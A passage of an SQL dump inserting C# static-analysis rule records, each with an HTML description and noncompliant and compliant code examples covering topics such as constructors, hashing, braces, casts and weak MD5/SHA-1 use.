</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812253, 1510817812253, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (397, 'Utility classes should not have public constructors', 'S1118', NULL, 'csharpsquid', '<p>
    Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even
    <code>abstract</code> utility classes, which can be extended, should not have <code>public</code> constructors.
</p>
<p>
    C# adds an implicit public constructor to every class which does not explicitly define at least one constructor. Hence, at
    least one <code>protected</code> constructor should be defined if you wish to subclass this utility class. Or the
    <code>static</code> keyword should be added to the class declaration to prevent subclassing.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class StringUtils // Noncompliant
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public static class StringUtils
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
or
<pre>
public class StringUtils
{
  protected StringUtils()
  {
  }
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'design', false, 'HTML', 1510817812254, 1510817812254, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (398, '"GetHashCode" should not reference mutable fields', 'S2328', NULL, 'csharpsquid', '<p>
    <code>GetHashCode</code> is used to file an object in a <code>Dictionary</code> or <code>Hashtable</code>.
    If <code>GetHashCode</code> uses non-<code>readonly</code> fields and those fields change after the object
    is stored, the object immediately becomes mis-filed in the <code>Hashtable</code>. Any subsequent test to
    see if the object is in the <code>Hashtable</code> will return a false negative.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person
{
  public int age;
  public string name;

  public override int GetHashCode()
  {
    int hash = 12;
    hash += this.age.GetHashCode(); // Noncompliant
    hash += this.name.GetHashCode(); // Noncompliant
    return hash;
  }
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Person
{
  public readonly DateTime birthday;
  public string name;

  public override int GetHashCode()
  {
    int hash = 12;
    hash += this.birthday.GetHashCode();
    return hash;
  }
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812255, 1510817812256, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (400, '"base()" constructor calls should not be explicitly made', 'S3253', NULL, 'csharpsquid', '<p>
    Since the compiler will automatically invoke the base type''s no-argument constructor, there''s no need to specify its invocation explicitly. Doing so just clutters the code.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class X
{
  public X()
  {
    /* ... */
  }
}

class Y : X
{
  public Y(int parameter) : base() // Noncompliant
  {
    /* does something with the parameter */
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class X
{
  public X()
  {
    /* ... */
  }
}

class Y : X
{
  public Y(int parameter)
  {
    /* does something with the parameter */
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812258, 1510817812260, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (401, 'Multiline blocks should be enclosed in curly braces', 'S2681', NULL, 'csharpsquid', '<p>
Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be misleading and induce bugs.
This rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block, but the omission of curly braces means the lines will be unconditionally executed once.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

string str = null;
for (int i = 0; i < array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>

<h2>Compliant Solution</h2>
<pre>
if (condition)
{
  firstActionInBlock();
  secondAction();
}
thirdAction();

string str = null;
for (int i = 0; i < array.length; i++)
{
  str = array[i];
  doTheThing(str);
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812260, 1510817812261, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (402, 'Attribute, EventArgs, and Exception type names should end with the type being extended', 'S3376', NULL, 'csharpsquid', '<p>
    Adherence to the standard naming conventions makes your code not only more readable, but more usable. For instance,
    <code>class FirstAttribute : Attribute</code> can be used simply with <code>First</code>, but you must use the full
    name for <code>class AttributeOne : Attribute</code>.
</p>
<p>
    This rule raises an issue when classes extending <code>Attribute</code>, <code>EventArgs</code>, or
    <code>Exception</code>, do not end with their parent class names.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class AttributeOne : Attribute  // Noncompliant
{
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class FirstAttribute : Attribute
{
}
</pre>

<h2>Exceptions</h2>
<p>
    If a class'' direct base class doesn''t follow the convention, then no issue is reported on the class itself, regardless of
    whether or not it conforms to the convention.
</p>
<pre>
class Timeout : Exception // Noncompliant
{
}
class ExtendedTimeout : Timeout // Ignored; doesn''t conform to convention, but the direct base doesn''t conform either
{
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812262, 1510817812262, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (433, 'Methods should not have too many parameters', 'S107', NULL, 'csharpsquid', '<p>
A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many things.
</p>

<h2>Noncompliant Code Example</h2>
<p>The following code snippet illustrates this rule with a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, string param4, long param5)
{
...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, string param4)
{
...
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812307, 1510817812308, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (403, 'Two branches in the same conditional structure should not have exactly the same implementation', 'S1871', NULL, 'csharpsquid', '<p>
    Having two <code>cases</code> in the same <code>switch</code> statement or branches in the same <code>if</code> structure
    with the same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for
    both instances, then in an <code>if</code> structure they should be combined, or for a <code>switch</code>, one should fall
    through to the other.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
switch (i)
{
  case 1:
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1''s implementation
    doSomething();
    break;
  default:
    doTheRest();
}

if (a >= 0 &amp;&amp; a < 10)
{
  doTheThing();
}
else if (a >= 10 &amp;&amp; a < 20)
{
  doTheOtherThing();
}
else if (a >= 20 &amp;&amp; a < 50)
{
  doTheThing();  // Noncompliant; duplicates first condition
}
else
{
  doTheRest();
}

if (b == 0)
{
  doOneMoreThing();
}
</pre>

<h2>Compliant Solution</h2>
<pre>
switch (i) {
  case 1:
  case 3:
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  default:
    doTheRest();
}

if ((a >= 0 &amp;&amp; a < 10) || (a >= 20 &amp;&amp; a < 50))
{
  doTheThing();
}
else if (a >= 10 &amp;&amp; a < 20)
{
  doTheOtherThing();
}
else
{
  doTheRest();
}

doOneMoreThing();
</pre>
or
<pre>
switch (i)
{
  case 1:
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:
    doThirdThing();
    break;
  default:
    doTheRest();
}

if (a >= 0 &amp;&amp; a < 10)
{
  doTheThing();
}
else if (a >= 10 &amp;&amp; a < 20)
{
  doTheOtherThing();
}
else if (a >= 20 &amp;&amp; a < 50)
{
  doTheThirdThing();
}
else
{
  doTheRest();
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'design,suspicious', false, 'HTML', 1510817812263, 1510817812263, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (404, 'Declarations and initializations should be as concise as possible', 'S3257', NULL, 'csharpsquid', '<p>
    Unnecessarily verbose declarations and initializations make it harder to read the code, and should be simplified.
</p>
<p>
    Specifically the following should be omitted when they can be inferred:
    <ul>
        <li>array element type</li>
        <li>array size</li>
        <li><code>new DelegateType</code></li>
        <li><code>new Nullable&lt;Type&gt;</code></li>
        <li>object or collection initializers (<code>{}</code>)</li>
        <li>type of lambda expression parameters</li>
        <li>parameter declarations of anonymous methods when the parameters are not used.</li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var l = new List&lt;int&gt;() {}; // Noncompliant, {} can be removed
var o = new object() {}; // Noncompliant, {} can be removed

var ints = new int[] {1, 2, 3}; // Noncompliant, int can be omitted
ints = new int[3] {1, 2, 3}; // Noncompliant, the size specification can be removed

int? i = new int?(5); // Noncompliant new int? could be omitted, it can be inferred from the declaration, and there''s implicit conversion from T to T?
var j = new int?(5);

Func&lt;int, int&gt; f1 = (int i) => 1; //Noncompliant, can be simplified

class Class
{
  private event EventHandler MyEvent;

  public Class()
  {
    MyEvent += new EventHandler((a,b) => { }); // Noncompliant, needlessly verbose
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var l = new List&lt;int&gt;();
var o = new object();

var ints = new [] {1, 2, 3};
ints = new [] {1, 2, 3};

int? i = 5;
var j = new int?(5);

Func&lt;int, int&gt; f1 = (i) => 1;

class Class
{
  private event EventHandler MyEvent;

  public Class()
  {
    MyEvent += (a,b) => { };
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812264, 1510817812265, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (405, 'Empty "default" clauses in a "switch" should be removed', 'S3532', NULL, 'csharpsquid', '<p>
    The <code>default</code> clause should take appropriate action. Having an empty <code>default</code> is a waste of keystrokes.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
enum Fruit
{
  Apple,
  Orange,
  Banana
}

void PrintName(Fruit fruit)
{
  switch(fruit)
  {
    case Fruit.Apple:
      Console.WriteLine("apple");
      break;
    default:  //Noncompliant
      break;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
enum Fruit
{
  Apple,
  Orange,
  Banana
}

void PrintName(Fruit fruit)
{
  switch(fruit)
  {
    case Fruit.Apple:
      Console.WriteLine("apple");
      break;
    default:
      throw new NotSupportedException();
  }
}
</pre>
<p>or</p>
<pre>
void PrintName(Fruit fruit)
{
  switch(fruit)
  {
    case Fruit.Apple:
      Console.WriteLine("apple");
      break;
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'clumsy,finding,unused', false, 'HTML', 1510817812266, 1510817812266, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (406, '"for" loop incrementers should modify the variable being tested in the loop''s stop condition', 'S1994', NULL, 'csharpsquid', '<p>
It is almost always an error when a <code>for</code> loop''s stop condition and incrementer don''t act on the same variable. Even when it is not, it could confuse future maintainers of the code, and should be avoided.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i < 10; j++) // Noncompliant
{
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
for (i = 0; i < 10; i++)
{
  // ...
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812267, 1510817812267, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (407, 'SHA-1 and Message-Digest hash algorithms should not be used', 'S2070', NULL, 'csharpsquid', '<p>
    The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to
    create hash collisions with them. That is, it takes too little computational effort to come up with a
    different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash value gives an
    attacker the same access as if he had the originally-hashed value. This applies as well to the other
    Message-Digest algorithms: MD2, MD4, MD6.
</p>

<p>
    This rule tracks usage of the <code>System.Security.Cryptography.CryptoConfig.CreateFromName()</code>, and <code>System.Security.Cryptography.HashAlgorithm.Create()</code> methods to instantiate MD5 or SHA-1 algorithms, and of derived class instances of <code>System.Security.Cryptography.SHA1</code> and <code>System.Security.Cryptography.MD5</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var hashProvider1 = new MD5CryptoServiceProvider(); //Noncompliant
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("MD5"); //Noncompliant
var hashProvider3 = new SHA1Managed(); //Noncompliant
var hashProvider4 = HashAlgorithm.Create("SHA1"); //Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
var hashProvider1 = new SHA256Managed();
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("SHA256Managed");
var hashProvider3 = HashAlgorithm.Create("SHA256Managed");
</pre>

<h2>See</h2>

<ul>
    <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash</li>
    <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>
    <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>
    <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses</li>
    <li>Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#WEAK_MESSAGE_DIGEST">MessageDigest Is Weak</a></li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cwe,owasp-a6,sans-top25-porous', false, 'HTML', 1510817812268, 1510817812268, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (408, 'Inheritance list should not be redundant', 'S1939', NULL, 'csharpsquid', '<p>
    An inheritance list entry is redundant if:
    <ul>
        <li>It is <code>Object</code> - all classes extend <code>Object</code> implicitly.</li>
        <li>It is <code>int</code> for an <code>enum</code></li>
        <li>It is a base class of another listed inheritance.</li>
    </ul>
    Such redundant declarations should be removed because they needlessly clutter the code and can be confusing.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass : Object  // Noncompliant

enum MyEnum : int  // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
public class MyClass

enum MyEnum
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812269, 1510817812270, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (409, 'Right operands of shift operators should be integers', 'S3449', NULL, 'csharpsquid', '<p>
    Numbers can be shifted with the <code>&lt;&lt;</code> and <code>&gt;&gt;</code> operators, but the right operand of the operation needs to be 
    an <code>int</code> or a type that has an implicit conversion to <code>int</code>. However, with <code>dynamic</code>, the compiler''s type 
    checking is turned off, so you can pass anything to a shift operator and have it compile. And if the argument can''t be converted to 
    <code>int</code> at runtime, then a <code>RuntimeBinderException</code> will be raised.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
dynamic d = 5;
var x = d &gt;&gt; 5.4; // Noncompliant
x = d &gt;&gt; null; // Noncompliant
x &lt;&lt;= new object(); // Noncompliant
</pre>', 4, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812270, 1510817812271, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (410, '"IDisposables" created in a "using" statement should not be returned', 'S2997', NULL, 'csharpsquid', '<p>
    Typically you want to use <code>using</code> to create a local <code>IDisposable</code> variable; it will trigger
    disposal of the object when control passes out of the block''s scope. The exception to this rule is when your
    method returns that <code>IDisposable</code>. In that case <code>using</code> disposes of the object before the
    caller can make use of it, likely causing exceptions at runtime. So you should either remove <code>using</code> or
    avoid returning the <code>IDisposable</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public FileStream WriteToFile(string path, string text)
{
  using (var fs = File.Create(path)) // Noncompliant
  {
    var bytes = Encoding.UTF8.GetBytes(text);
    fs.Write(bytes, 0, bytes.Length);
    return fs;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public FileStream WriteToFile(string path, string text)
{
  var fs = File.Create(path);
  var bytes = Encoding.UTF8.GetBytes(text);
  fs.Write(bytes, 0, bytes.Length);
  return fs;
}
</pre>', 4, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812272, 1510817812272, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (411, 'The ternary operator should not return the same value regardless of the condition', 'S2758', NULL, 'csharpsquid', '<p>
    When the second and third operands of a ternary operator are the same, the operator will always
    return the same value regardless of the condition. Either the operator itself is pointless, or a
    mistake was made in coding it.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public boolean canVote(Person person)
{
  return person.getAge > 18 ? true : true; // Noncompliant; is this what was intended?
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public boolean canVote(Person person)
{
  return person.getAge > 18 ? true : false;
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812273, 1510817812273, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (423, 'Interfaces with colliding, inherited members should explicitly redefine interface members', 'S3444', NULL, 'csharpsquid', '<p>
    When an interface <code>IDerived</code> inherits from two interfaces <code>IBase1</code> and <code>IBase2</code> that both 
    define a member <code>SomeProperty</code>, calling <code>IDerived.SomeProperty</code> will result in the compiler error 
    <code>CS0229 Ambiguity between ''IBase1.SomeProperty'' and ''IBase2.SomeProperty''</code>.
</p>
<p>
    Every caller will be forced to cast instances of <code>IDerived</code> to <code>IBase1</code> or <code>IBase2</code> to 
    resolve the ambiguity and to be able to access <code>SomeProperty</code>. Instead, it is better to resolve the ambiguity on 
    the definition of <code>IDerived</code> either by:
    <ul>
        <li>renaming one of the <code>SomeProperty</code> in <code>IBase1</code> or <code>IBase2</code> to remove the collision</li>
        <li>or by also defining a new <code>SomeProperty</code> member on <code>IDerived</code>. Use this only if all 
        <code>SomeProperty</code> are meant to hold the same value.</li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public interface IBase1
{
  string SomeProperty { get; set; }
}

public interface IBase2
{
  string SomeProperty { get; set; }
}

public interface IDerived : IBase1, IBase2 // Noncompliant, accessing IDerived.SomeProperty is ambiguous
{
}

public class MyClass : IDerived
{
  // Implements both IBase1.SomeProperty and IBase2.SomeProperty
  public string SomeProperty { get; set; } = "Hello";

  public static void Main()
  {
    MyClass myClass = new MyClass();
    Console.WriteLine(myClass.SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase1)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase2)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IDerived)myClass).SomeProperty); // Error CS0229 Ambiguity between ''IBase1.SomeProperty'' and ''IBase2.SomeProperty''
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public interface IDerived : IBase1, IBase2
{
  new string SomeProperty { get; set; }
}

public class MyClass : IDerived
{
  // Implements IBase1.SomeProperty, IBase2.SomeProperty and IDerived.SomeProperty
  public string SomeProperty { get; set; } = "Hello";

  public static void Main()
  {
    MyClass myClass = new MyClass();
    Console.WriteLine(myClass.SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase1)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase2)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IDerived)myClass).SomeProperty); // Writes "Hello" as expected
  }
}
</pre>
<p>or</p>
<pre>
public interface IBase1
{
  string SomePropertyOne { get; set; }
}

public interface IBase2
{
  string SomePropertyTwo { get; set; }
}

public interface IDerived : IBase1, IBase2
{
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'design', false, 'HTML', 1510817812295, 1510817812296, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (412, 'Inappropriate casts should not be made', 'S1944', NULL, 'csharpsquid', '<p>
    Inappropriate casts are issues that will lead to unexpected behavior or runtime errors, such as
    <code>InvalidCastException</code>s. The compiler will catch bad casts from one class to another, but not bad casts to
    interfaces.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public interface MyInterface
{ /* ... */ }

public class Implementer : MyInterface
{ /* ... */ }

public class MyClass
{ /* ... */ }

public static class Program
{
  public static void Main()
  {
    var myclass = new MyClass();
    var x = (MyInterface) myclass; // Noncompliant, InvalidCastException is being thrown
    var b = myclass is MyInterface; // Noncompliant, always false
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    No issue is reported if the interface has no implementing class in the assembly.
</p>

<h2>See</h2>
<ul>
    <li>MISRA C:2004, 11.4 - A cast should not be performed between a pointer to object type and an integral type.</li>
    <li>MISRA C++:2008, 5-2-3 - Casts to a base class from a derived class should not be performed on polymorphic types.</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/tgAV">CERT, EXP36-C.</a> - Do not cast pointers into more strictly aligned pointer types</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/j4AyAQ">CERT, EXP56-CPP.</a> - Do not cast pointers into more strictly aligned pointer types</li>
    <li><a href="http://cwe.mitre.org/data/definitions/588.html">MITRE, CWE-588</a> - Attempt to Access Child of a Non-structure Pointer</li>
    <li><a href="http://cwe.mitre.org/data/definitions/704.html">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,misra,pitfall', false, 'HTML', 1510817812274, 1510817812274, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (413, '"=+" should not be used instead of "+="', 'S2757', NULL, 'csharpsquid', '<p>
    The use of operators pairs (<code>=+</code> or <code>=-</code>) where the reversed, single operator
    was meant (<code>+=</code> or <code>-=</code>) will compile and run, but not produce the expected results.
</p>
<p>
    This rule raises an issue when <code>=+</code>, and <code>=-</code> are used, but ignores the operators
    when they''re spaced out: <code>= +</code>, <code>= -</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num; // Noncompliant; target = -3. Is that really what''s meant?
target =+ num; // Noncompliant; target = 3
</pre>

<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num; // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812275, 1510817812276, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (414, 'Redundant property names should be omitted in anonymous classes', 'S3441', NULL, 'csharpsquid', '<p>
    When an anonymous type''s properties are copied from properties or variables with the same names, it yields cleaner code to
    omit the new type''s property name and the assignment operator.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var X = 5;

var anon = new
{
  X = X, //Noncompliant, the new object would have the same property without the "X =" part.
  Y = "my string"
};
</pre>

<h2>Compliant Solution</h2>
<pre>
var X = 5;

